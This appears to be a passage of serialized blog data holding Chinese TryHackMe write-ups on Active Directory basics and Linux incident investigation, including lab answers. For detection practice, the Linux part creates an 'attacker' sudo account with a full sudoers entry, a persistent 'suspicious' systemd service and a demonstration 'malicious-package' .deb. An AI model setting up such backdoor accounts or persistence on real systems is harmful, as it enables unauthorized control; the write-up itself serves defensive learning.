</p>\n<p>只能说我一开始是没搞明白啥意思</p>\n<p>我们在Windows的搜索栏搜一下users</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/group.png\" alt=\"task5\"></p>\n<p>点进去照着图这么设置 显示出所有的东西</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix.png\" alt=\"task5\"></p>\n<p>找到computer这个组</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix2.png\" alt=\"task5\"></p>\n<p>将这里的勾去掉</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fix3.png\" alt=\"task5\"></p>\n<p>然后点击thm.local 新建两个文件一个是servers另一个是workstations</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/fixxx.png\" alt=\"task5\"></p>\n<p>恭喜<del>你被我恭喜到了</del>以上是让你熟悉熟悉操作的 打开computer那个组 把s开头的那几个减掉 就是第一题的答案</p>\n<p>第二题当然是yay</p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>Windows 通过<strong>组策略对象</strong> ( GPO )管理此类策略。GPO 只是可应用于 <strong>OU</strong>的设置集合。GPO 可以包含针对用户或计算机的策略，</p>\n<p>GPO 通过名为 的网络共享分发到网络<strong>SYSVOL</strong>，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向C:\\Windows\\SYSVOL\\sysvol\\我们网络中每个 DC 上的目录。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gpupdate /force</span><br></pre></td></tr></table></figure>\n\n<p>我们看一下题目</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task6.png\"></p>\n<p>第一题是通过sysvol将gpo分发到域机器</p>\n<p>第二题 gpo可以将设置应用在用户和计算机</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>身份验证方法</p>\n<p>Windows 域中的网络身份验证可以使用两种协议：<br><strong>Kerberos</strong>：任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。</p>\n<p><strong>NetNTLM</strong>：为了兼容性目的而保留的旧式身份验证协议。</p>\n<h3 id=\"Kerberos身份验证\"><a href=\"#Kerberos身份验证\" class=\"headerlink\" title=\"Kerberos身份验证\"></a>Kerberos身份验证</h3><p>Kerberos身份验证是 Windows 最新版本的默认身份验证协议。使用Kerberos登录服务的用户将被分配票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其出示给服务，以证明他们之前已通过网络身份验证，因此可以使用该服务。</p>\n<p>当使用Kerberos进行身份验证时，会发生以下过​​程：</p>\n<h4 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h4><p>用户将其用户名和使用从其密码派生的密钥加密的<strong>时间戳</strong>发送到<strong>密钥分发中心 (KDC)<strong>，kdc负责在网络上创建</strong>Kerberos票证</strong>。</p>\n<p><strong>KDC</strong>将创建并返回一个票证授予**票证 ( TGT )**，这将允许用户请求更多票证以访问特定服务。需要票证才能获得更多票证听起来可能有点奇怪，但它允许用户在每次想要连接到服务时请求服务票证而无需传递其凭据。除了 TGT 之外，还会向用户提供会话密钥，他们将需要该密钥来生成以下请求。</p>\n<h4 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h4><p>当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求**票证授予服务 (TGS)**。TGS 是仅允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务主体名称 (SPN)，后者指示我们打算访问的服务和服务器名称。</p>\n<p>因此，KDC 将向我们发送 TGS 以及服务会话密钥，我们需要该密钥来验证我们要访问的服务。TGS 使用从 服务所有者哈希派生的密钥进行加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>\n<h4 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h4><p>然后，TGS 可以发送到所需的服务以进行身份​​验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</p>\n<h3 id=\"NetNTLM-身份验证\"><a href=\"#NetNTLM-身份验证\" class=\"headerlink\" title=\"NetNTLM 身份验证\"></a>NetNTLM 身份验证</h3><p>NetNTLM 采用质询-响应机制。 整个过程如下：</p>\n<p>1.客户端向其想要访问的服务器发送身份验证请求。<br>2.服务器生成一个随机数并将其作为挑战发送给客户端。<br>3.客户端将其NTLM密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。<br>4.服务器将质询和响应转发给域控制器进行验证。<br>5.域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。<br>6.服务器将认证结果转发给客户端。</p>\n<p>请注意，出于安全考虑，用户的密码（或哈希值）绝不会通过网络传输。</p>\n<hr>\n<p>任务七的题目在这</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/task7.png\" alt=\"task7\"></p>\n<p>第一题 Windows是默认使用<strong>Kerberos</strong> 所以填nay</p>\n<p>第二题 当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其<strong>TGT</strong>向 KDC 请求票证授予服务 (TGS) tgt就是答案</p>\n<p>第三题 密码不会通过网络传输 填nay</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>trees forests and trusts</p>\n<h3 id=\"trees\"><a href=\"#trees\" class=\"headerlink\" title=\"trees\"></a>trees</h3><p>Active Directory 支持集成多个域，这样就可以将网络划分为可以独立管理的单元。如果您有两个共享<strong>相同命名空间</strong>的域，则可以将这些域合并为一个**tree(树)**。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/tree.png\" alt=\"tree\"></p>\n<h3 id=\"forests\"><a href=\"#forests\" class=\"headerlink\" title=\"forests\"></a>forests</h3><p>将具有<strong>不同命名空间</strong>的多个树合并到<strong>同一个网络</strong>中称为<strong>forest森林</strong>。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/forest.png\" alt=\"forest\"></p>\n<h3 id=\"trusts\"><a href=\"#trusts\" class=\"headerlink\" title=\"trusts\"></a>trusts</h3><p>以树和森林形式组织的多个域可让您在管理和资源方面拥有良好的分区网络。但在某个时候，alice的用户可能需要访问bob 服务器之一中的共享文件。为此，以树和森林形式组织的域通过信任关系连接在一起。</p>\n<p>还可以建立双向信任关系，以允许两个域相互授权对方的用户。默认情况下，将多个域加入一棵树或一个森林下将形成双向信任关系。</p>\n<p><img src=\"/images/Active-Directory-Basics%E6%95%99%E7%A8%8B/8.png\" alt=\"task8\"></p>\n<p>第一题就是tree<br>第二题是a trust relationship   </p>\n<p>也算是做完这个了 就是熟悉活动目录 以及对用户和组的一些管理 了解了解一些功能。太太太粪怪了 没多大意思</p>\n"},{"title":"Linux Incident Surface教程","date":"2025-01-17T02:58:18.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/19/Py1BRItriwm8fAE.png","_content":"ok啊 因为下学期要来一个linux的课 我打算先把tryhackme的linux先搞一遍 学习学习linux的命令 方便下学期学习\n\n本次教程用了ps lsof journalctl dpkg命令 查了auth.log和dpkg.log 这些log中都得学会用grep命令 这个是真的好用\n\n![开头](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20110940.png)\n\n我们用ssh先连接一下机子\n```\nssh tryhackme@ip\n```\n\ntask3是一个看的文章 我们直接跳过\n\n## task4\n\n![task4](/images/Linux%20Incident%20Surface教程/task4.png)\n\n### 第一步\n\n我们按照文章所说 先运行一个简单程序\n但首先记得先sudo su \n\n![第一步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20160531.png)\n\n```\ngcc simple.c -o /tmp/simple\n/tmp/simple\n```\n![第1步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20160920.png)\n\n\n这里的gcc是c的编译器\n\n### 第二步\n我们使用ps aux查看运行的进程 \n-aux 显示所有包含其他使用者的进程\n\n```\nps aux | grep simple\n搜索进程是simple这个名的\n```\n\n![第二步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20161218.png)\n\n### 第三步\n\n这一步要用到我们刚才查询到的进程的pid\n\n```\nlsof -p pid\n用来搜索对应pid的进程\n```\n![第三步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20161542.png)\n\nlsof下面显示的东西等让我们对文件了解多一点\n\n### 第四步 \n我们先回到/home/activities/processes 启动一下netcom(./netcom) 这一步能让我们连接到远程ip的\n\n其实到这一步 我们已找到了第一题的答案\n\n```\nlsof -l -P-n\n查找我们刚才的netcom进程\n```\n\n![第四步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20162402.png)\n\n进入osquery \n\n```\nosqueryi\nSELECT pid, fd, socket, local_address, remote_address,remote_port  FROM process_open_sockets WHERE pid =你的pid;\n```\n![第四步](images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20163204.png)\n\n一下子把端口和ip都搞到手了\n\n### 第五步\n开始之前 先运行这三个代码\n\n```\nsudo useradd attacker -G sudo\nsudo passwd attacker\necho \"attacker ALL=(ALL:ALL) ALL\" | sudo tee -a /etc/sudoers\n```\n\n![第五步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20165656.png)\n\n假如我们cat一下auth.log的useradd字眼\n\n![cat](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20165656.png)\n\n到etc的passwd里面查找\n![passwd](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20171452.png)\n\n你就能发现刚才操作的痕迹\n\n### task5\n\n![task](/images/Linux%20Incident%20Surface教程/task5.png)\n\n先创建一个配置文件\n```\nsudo nano /etc/systemd/system/suspicious.service\n```\n将以下复制粘贴进去\n\n```\n[Unit]\nDescription=Suspicious_Service\nAfter=network.target\n\n[Service]\nExecStart=/home/activities/processes/suspicious\nRestart=on-failure\nUser=nobody\nGroup=nogroup\n\n[Install]\nWantedBy=multi-user.target\n```\n\n然后重启一下服务\n```\n重新加载 systemd 管理器配置以识别新服务：\n命令：sudo systemctl daemon-reload\n\n启用服务在启动时运行：\n命令：sudo systemctl enable suspicious.service\n\n立即开始服务。\n命令：sudo systemctl start suspicious.service\n```\n\n![第五](/images/Linux%20Incident%20Surface教程/3个sys.png)\n\n我们能看到运行成功\n\n![第五](/images/Linux%20Incident%20Surface教程/running.png)\n\n运行成功之后到/etc/systemd/system 中查找\n你会发现一个叫benign.service的东西 cat一下就会发现他和我们写的那个脚本差不多\n\n![ben](/images/Linux%20Incident%20Surface教程/bengin.png)\n\n其中的execstart的benign就是题目需要的进程\n\n最后一题的话 就是搜索日记 一个一个数 直接输入journalctl可能要找一下九月11的记录 我们可以根据日志进行筛选 能看出有七个\n\n```\njournalctl -u benign.service --since \"2024-09-11\"\n```\n\n![jour](/images/Linux%20Incident%20Surface教程/journalctl.png)\n\n## task6\n\n![task6](/images/Linux%20Incident%20Surface教程/task6.png)\n\n创建一个目录 然后创建control文件和恶意脚本\n\n![control](/images/Linux%20Incident%20Surface教程/control.png)\n\n把这一行复制到control里面\n```\nPackage: malicious-package\nVersion: 1.0\nSection: base\nPriority: optional\nArchitecture: all\nMaintainer: attacker@test.com\nDescription: This is a malicious Package\n```\n\n然后vim创建一个名字叫postinst的脚本\n\n```\n#!/bin/bash\n# Malicious post-installation script\n# It will run this script after installation\n\n# Print a suspicious message - for demonstration\necho \"something suspicious\"\n```\n给脚本赋权\n\n```\nchmod 755 malicious-package/DEBIAN/postinst(记得你的路径要搞对)\n```\n\n退回到malicious-package的根目录 构建安装包\n\n![goujian](/images/Linux%20Incident%20Surface教程/goujian.png)\n\n```\ndpkg -i malicious-package.deb\n```\n搞完这一一步\n使用dpkg进行检查已经安装的包\n\n```\ndpkg -l | grep malicious\n```\n![jiancha](/images/Linux%20Incident%20Surface教程/jianchaanz.png)\n\n\n接着我们查看dpgk.log\n```\ngrep \" install \" /var/log/dpkg.log\n```\n![jiancha](/images/Linux%20Incident%20Surface教程/chackanzhuang.png)\n\n你会发现第二题的答案出来了 c2omm\n\n## task7\n![task7](/images/Linux%20Incident%20Surface教程/题目7.png)\n\n其实看到题目一直被困在auth中 我以为只有一个 进入到/var/log中 \n\n```\nll auth*\n\n```\n其实会发现三个auth的日志\n\n![auth](/images/Linux%20Incident%20Surface教程/auth.png)\n\n```\ncat auth.log | grep ssh\ncat auth.log.1 | grep ssh\n```\n![auth](/images/Linux%20Incident%20Surface教程/auth.png)\n\n题目说是ssh 我们就搜关键词 一个一个检查\n\n```\ncat auth.log | grep ssh\n```\n![check](/images/Linux%20Incident%20Surface教程/authlog2.png)\n\n```\ncat auth.log.1 | grep ssh\n```\n\n![check](/images/Linux%20Incident%20Surface教程/authcheck.png)\n\n到此所有任务就算完成了 只能说是做的过程波澜曲折了 可能也是我比较菜吧 继续加油","source":"_posts/Linux-Incident-Surface教程.md","raw":"---\ntitle: Linux Incident Surface教程\ndate: 2025-01-17 10:58:18\ntags: linux 安全 管理\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/19/Py1BRItriwm8fAE.png\n---\nok啊 因为下学期要来一个linux的课 我打算先把tryhackme的linux先搞一遍 学习学习linux的命令 方便下学期学习\n\n本次教程用了ps lsof journalctl dpkg命令 查了auth.log和dpkg.log 这些log中都得学会用grep命令 这个是真的好用\n\n![开头](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20110940.png)\n\n我们用ssh先连接一下机子\n```\nssh tryhackme@ip\n```\n\ntask3是一个看的文章 我们直接跳过\n\n## task4\n\n![task4](/images/Linux%20Incident%20Surface教程/task4.png)\n\n### 第一步\n\n我们按照文章所说 先运行一个简单程序\n但首先记得先sudo su \n\n![第一步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20160531.png)\n\n```\ngcc simple.c -o /tmp/simple\n/tmp/simple\n```\n![第1步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20160920.png)\n\n\n这里的gcc是c的编译器\n\n### 第二步\n我们使用ps aux查看运行的进程 \n-aux 显示所有包含其他使用者的进程\n\n```\nps aux | grep simple\n搜索进程是simple这个名的\n```\n\n![第二步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20161218.png)\n\n### 第三步\n\n这一步要用到我们刚才查询到的进程的pid\n\n```\nlsof -p pid\n用来搜索对应pid的进程\n```\n![第三步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20161542.png)\n\nlsof下面显示的东西等让我们对文件了解多一点\n\n### 第四步 \n我们先回到/home/activities/processes 启动一下netcom(./netcom) 这一步能让我们连接到远程ip的\n\n其实到这一步 我们已找到了第一题的答案\n\n```\nlsof -l -P-n\n查找我们刚才的netcom进程\n```\n\n![第四步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20162402.png)\n\n进入osquery \n\n```\nosqueryi\nSELECT pid, fd, socket, local_address, remote_address,remote_port  FROM process_open_sockets WHERE pid =你的pid;\n```\n![第四步](images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20163204.png)\n\n一下子把端口和ip都搞到手了\n\n### 第五步\n开始之前 先运行这三个代码\n\n```\nsudo useradd attacker -G sudo\nsudo passwd attacker\necho \"attacker ALL=(ALL:ALL) ALL\" | sudo tee -a /etc/sudoers\n```\n\n![第五步](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20165656.png)\n\n假如我们cat一下auth.log的useradd字眼\n\n![cat](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20165656.png)\n\n到etc的passwd里面查找\n![passwd](/images/Linux%20Incident%20Surface教程/屏幕截图%202025-01-17%20171452.png)\n\n你就能发现刚才操作的痕迹\n\n### task5\n\n![task](/images/Linux%20Incident%20Surface教程/task5.png)\n\n先创建一个配置文件\n```\nsudo nano /etc/systemd/system/suspicious.service\n```\n将以下复制粘贴进去\n\n```\n[Unit]\nDescription=Suspicious_Service\nAfter=network.target\n\n[Service]\nExecStart=/home/activities/processes/suspicious\nRestart=on-failure\nUser=nobody\nGroup=nogroup\n\n[Install]\nWantedBy=multi-user.target\n```\n\n然后重启一下服务\n```\n重新加载 systemd 管理器配置以识别新服务：\n命令：sudo systemctl daemon-reload\n\n启用服务在启动时运行：\n命令：sudo systemctl enable suspicious.service\n\n立即开始服务。\n命令：sudo systemctl start suspicious.service\n```\n\n![第五](/images/Linux%20Incident%20Surface教程/3个sys.png)\n\n我们能看到运行成功\n\n![第五](/images/Linux%20Incident%20Surface教程/running.png)\n\n运行成功之后到/etc/systemd/system 中查找\n你会发现一个叫benign.service的东西 cat一下就会发现他和我们写的那个脚本差不多\n\n![ben](/images/Linux%20Incident%20Surface教程/bengin.png)\n\n其中的execstart的benign就是题目需要的进程\n\n最后一题的话 就是搜索日记 一个一个数 直接输入journalctl可能要找一下九月11的记录 我们可以根据日志进行筛选 能看出有七个\n\n```\njournalctl -u benign.service --since \"2024-09-11\"\n```\n\n![jour](/images/Linux%20Incident%20Surface教程/journalctl.png)\n\n## task6\n\n![task6](/images/Linux%20Incident%20Surface教程/task6.png)\n\n创建一个目录 然后创建control文件和恶意脚本\n\n![control](/images/Linux%20Incident%20Surface教程/control.png)\n\n把这一行复制到control里面\n```\nPackage: malicious-package\nVersion: 1.0\nSection: base\nPriority: optional\nArchitecture: all\nMaintainer: attacker@test.com\nDescription: This is a malicious Package\n```\n\n然后vim创建一个名字叫postinst的脚本\n\n```\n#!/bin/bash\n# Malicious post-installation script\n# It will run this script after installation\n\n# Print a suspicious message - for demonstration\necho \"something suspicious\"\n```\n给脚本赋权\n\n```\nchmod 755 malicious-package/DEBIAN/postinst(记得你的路径要搞对)\n```\n\n退回到malicious-package的根目录 构建安装包\n\n![goujian](/images/Linux%20Incident%20Surface教程/goujian.png)\n\n```\ndpkg -i malicious-package.deb\n```\n搞完这一一步\n使用dpkg进行检查已经安装的包\n\n```\ndpkg -l | grep malicious\n```\n![jiancha](/images/Linux%20Incident%20Surface教程/jianchaanz.png)\n\n\n接着我们查看dpgk.log\n```\ngrep \" install \" /var/log/dpkg.log\n```\n![jiancha](/images/Linux%20Incident%20Surface教程/chackanzhuang.png)\n\n你会发现第二题的答案出来了 c2omm\n\n## task7\n![task7](/images/Linux%20Incident%20Surface教程/题目7.png)\n\n其实看到题目一直被困在auth中 我以为只有一个 进入到/var/log中 \n\n```\nll auth*\n\n```\n其实会发现三个auth的日志\n\n![auth](/images/Linux%20Incident%20Surface教程/auth.png)\n\n```\ncat auth.log | grep ssh\ncat auth.log.1 | grep ssh\n```\n![auth](/images/Linux%20Incident%20Surface教程/auth.png)\n\n题目说是ssh 我们就搜关键词 一个一个检查\n\n```\ncat auth.log | grep ssh\n```\n![check](/images/Linux%20Incident%20Surface教程/authlog2.png)\n\n```\ncat auth.log.1 | grep ssh\n```\n\n![check](/images/Linux%20Incident%20Surface教程/authcheck.png)\n\n到此所有任务就算完成了 只能说是做的过程波澜曲折了 可能也是我比较菜吧 继续加油","slug":"Linux-Incident-Surface教程","published":1,"updated":"2025-01-20T10:22:59.925Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxb0006tsg6fs1ber5c","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>ok啊 因为下学期要来一个linux的课 我打算先把tryhackme的linux先搞一遍 学习学习linux的命令 方便下学期学习</p>\n<p>本次教程用了ps lsof journalctl dpkg命令 查了auth.log和dpkg.log 这些log中都得学会用grep命令 这个是真的好用</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20110940.png\" alt=\"开头\"></p>\n<p>我们用ssh先连接一下机子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh tryhackme@ip</span><br></pre></td></tr></table></figure>\n\n<p>task3是一个看的文章 我们直接跳过</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>我们按照文章所说 先运行一个简单程序<br>但首先记得先sudo su </p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20160531.png\" alt=\"第一步\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc simple.c -o /tmp/simple</span><br><span class=\"line\">/tmp/simple</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20160920.png\" alt=\"第1步\"></p>\n<p>这里的gcc是c的编译器</p>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>我们使用ps aux查看运行的进程<br>-aux 显示所有包含其他使用者的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep simple</span><br><span class=\"line\">搜索进程是simple这个名的</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20161218.png\" alt=\"第二步\"></p>\n<h3 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h3><p>这一步要用到我们刚才查询到的进程的pid</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -p pid</span><br><span class=\"line\">用来搜索对应pid的进程</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20161542.png\" alt=\"第三步\"></p>\n<p>lsof下面显示的东西等让我们对文件了解多一点</p>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>我们先回到&#x2F;home&#x2F;activities&#x2F;processes 启动一下netcom(.&#x2F;netcom) 这一步能让我们连接到远程ip的</p>\n<p>其实到这一步 我们已找到了第一题的答案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -l -P-n</span><br><span class=\"line\">查找我们刚才的netcom进程</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20162402.png\" alt=\"第四步\"></p>\n<p>进入osquery </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">osqueryi</span><br><span class=\"line\">SELECT pid, fd, socket, local_address, remote_address,remote_port  FROM process_open_sockets WHERE pid =你的pid;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20163204.png\" alt=\"第四步\"></p>\n<p>一下子把端口和ip都搞到手了</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>开始之前 先运行这三个代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo useradd attacker -G sudo</span><br><span class=\"line\">sudo passwd attacker</span><br><span class=\"line\">echo &quot;attacker ALL=(ALL:ALL) ALL&quot; | sudo tee -a /etc/sudoers</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20165656.png\" alt=\"第五步\"></p>\n<p>假如我们cat一下auth.log的useradd字眼</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20165656.png\" alt=\"cat\"></p>\n<p>到etc的passwd里面查找<br><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20171452.png\" alt=\"passwd\"></p>\n<p>你就能发现刚才操作的痕迹</p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task5.png\" alt=\"task\"></p>\n<p>先创建一个配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo nano /etc/systemd/system/suspicious.service</span><br></pre></td></tr></table></figure>\n<p>将以下复制粘贴进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Suspicious_Service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">ExecStart=/home/activities/processes/suspicious</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">User=nobody</span><br><span class=\"line\">Group=nogroup</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>然后重启一下服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">重新加载 systemd 管理器配置以识别新服务：</span><br><span class=\"line\">命令：sudo systemctl daemon-reload</span><br><span class=\"line\"></span><br><span class=\"line\">启用服务在启动时运行：</span><br><span class=\"line\">命令：sudo systemctl enable suspicious.service</span><br><span class=\"line\"></span><br><span class=\"line\">立即开始服务。</span><br><span class=\"line\">命令：sudo systemctl start suspicious.service</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/3%E4%B8%AAsys.png\" alt=\"第五\"></p>\n<p>我们能看到运行成功</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/running.png\" alt=\"第五\"></p>\n<p>运行成功之后到&#x2F;etc&#x2F;systemd&#x2F;system 中查找<br>你会发现一个叫benign.service的东西 cat一下就会发现他和我们写的那个脚本差不多</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/bengin.png\" alt=\"ben\"></p>\n<p>其中的execstart的benign就是题目需要的进程</p>\n<p>最后一题的话 就是搜索日记 一个一个数 直接输入journalctl可能要找一下九月11的记录 我们可以根据日志进行筛选 能看出有七个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">journalctl -u benign.service --since &quot;2024-09-11&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/journalctl.png\" alt=\"jour\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task6.png\" alt=\"task6\"></p>\n<p>创建一个目录 然后创建control文件和恶意脚本</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/control.png\" 